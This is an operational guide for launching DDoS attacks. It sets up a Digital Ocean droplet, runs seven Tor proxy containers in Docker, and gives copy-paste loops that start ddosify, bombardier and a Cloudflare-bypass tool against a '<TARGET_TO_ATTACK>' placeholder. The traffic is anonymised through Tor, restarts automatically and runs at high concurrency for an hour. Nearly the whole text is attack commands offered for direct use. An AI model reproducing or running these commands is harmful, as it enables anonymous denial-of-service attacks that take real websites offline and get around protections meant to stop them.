# DDoS with Docker, Digital Ocean, TOR.

## Prepare Digital Ocean droplet (Ubuntu)

### Create a new droplet

https://docs.digitalocean.com/products/droplets/how-to/create/

### Allow SSH connections

```
sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/g' /etc/ssh/sshd_config && sudo service sshd restart
```

### Install docker

```
sudo apt update
sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
apt-cache policy docker-ce
sudo apt install -y docker-ce
sudo systemctl status docker
sudo usermod -aG docker ${USER}
```

### Run tor-proxy docker containers

```sh
for i in $(seq 0 6); do docker create --name tor${i} -it --restart=always -p $(expr 8118 + ${i}):8118 -p $(expr 9050 + ${i}):9050 dperson/torproxy; done
for i in $(seq 0 6); do docker start tor${i}; done
```

## Run DDoS

**Note, run one DDoS tool per droplet!**

### Run/re-run tool - DDOSIFY

```sh
for i in $(seq 1 5); do docker kill attack${i}; done
for i in $(seq 1 5); do docker rm attack${i}; done

for i in $(seq 1 5); do docker create --name attack${i} -it --restart=always --network="host" \
    ddosify/ddosify /bin/ddosify -P "http://localhost:$(expr 8118 + ${i})" -T 10 -n 50000 -d 3600 -p HTTPS -m GET -l linear -t <TARGET_TO_ATTACK> \
    ; done

for i in $(seq 1 5); do docker start attack${i}; done
```

### Run/re-run tool - BOMBARDIER

```sh
for i in $(seq 1 5); do docker kill attack${i}; done
for i in $(seq 1 5); do docker rm attack${i}; done

for i in $(seq 1 5); do docker create --name attack${i} -it --restart=always --network="host" \
    --env="https_proxy=http://localhost:$(expr 8118 + ${i})" \
    --env="http_proxy=http://localhost:$(expr 8118 + ${i})" \
    alpine/bombardier -c 50000 -d 1h -l <TARGET_TO_ATTACK> \
    ; done

for i in $(seq 1 5); do docker start attack${i}; done
````

### Run/re-run tool - CF-BYPASS

```sh
for i in $(seq 1 5); do docker kill attack${i}; done
for i in $(seq 1 5); do docker rm attack${i}; done

for i in $(seq 1 5); do docker create --name attack${i} -it --restart=always --network="host" \
    bobjoe9590/cf-bypass <TARGET_TO_ATTACK> 3600 http://localhost:$(expr 8118 + ${i}) \
    ; done

for i in $(seq 1 5); do docker start attack${i}; done
```
